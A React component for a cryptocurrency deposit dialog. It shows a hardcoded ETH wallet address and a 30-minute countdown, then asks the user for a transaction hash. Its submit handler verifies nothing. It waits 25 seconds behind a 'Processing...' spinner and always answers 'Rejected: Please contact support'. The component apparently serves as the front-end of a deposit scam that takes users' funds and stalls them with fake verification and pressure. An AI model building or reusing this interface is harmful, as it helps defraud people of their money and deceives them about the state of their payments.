import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { CountdownTimer } from "@/components/CountdownTimer";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface DepositConfirmationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  amount: string;
  onConfirm: (hash: string) => void;
}

const DepositConfirmationDialog = ({
  isOpen,
  onClose,
  amount,
  onConfirm
}: DepositConfirmationDialogProps) => {
  const [step, setStep] = useState<'amount' | 'hash'>('amount');
  const [depositAmount, setDepositAmount] = useState(amount);
  const [transactionHash, setTransactionHash] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";
  
  const endTime = new Date(new Date().getTime() + 30 * 60000).toISOString();

  const validateHash = (hash: string) => {
    if (hash.length < 10) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Invalid hash, please check your input"
      });
      return false;
    }
    return true;
  };

  const handleSubmit = async () => {
    if (!validateHash(transactionHash)) {
      return;
    }

    setIsSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 25000));
    setIsSubmitting(false);
    
    toast({
      variant: "destructive",
      title: "Rejected",
      description: "Please contact support"
    });
    
    onConfirm(transactionHash);
  };

  const handleNextStep = () => {
    if (!depositAmount || parseFloat(depositAmount) <= 0) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Please enter a valid amount"
      });
      return;
    }
    setStep('hash');
  };

  const handleClose = () => {
    setStep('amount');
    setTransactionHash("");
    setDepositAmount("");
    onClose();
  };

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Deposit Confirmation</DialogTitle>
          <DialogDescription className="space-y-4">
            {step === 'amount' ? (
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium">
                    Amount (ETH)
                  </label>
                  <Input
                    type="number"
                    step="0.001"
                    min="0"
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(e.target.value)}
                    placeholder="Enter amount"
                  />
                </div>
                <Button 
                  className="w-full" 
                  onClick={handleNextStep}
                >
                  Continue
                </Button>
              </div>
            ) : (
              <>
                <div className="mt-4">
                  <CountdownTimer endTime={endTime} />
                </div>
                
                <div className="space-y-2 mt-4">
                  <p>Please send {depositAmount} ETH to the following address:</p>
                  <div className="bg-muted p-2 rounded-md break-all font-mono">
                    {walletAddress} (ERC-20)
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium">
                    Transaction Hash
                  </label>
                  <Input
                    value={transactionHash}
                    onChange={(e) => setTransactionHash(e.target.value)}
                    placeholder="Enter transaction hash"
                    className="font-mono"
                  />
                </div>

                <Button 
                  className="w-full" 
                  onClick={handleSubmit}
                  disabled={!transactionHash || isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    'Confirm'
                  )}
                </Button>
              </>
            )}
          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
};

export default DepositConfirmationDialog;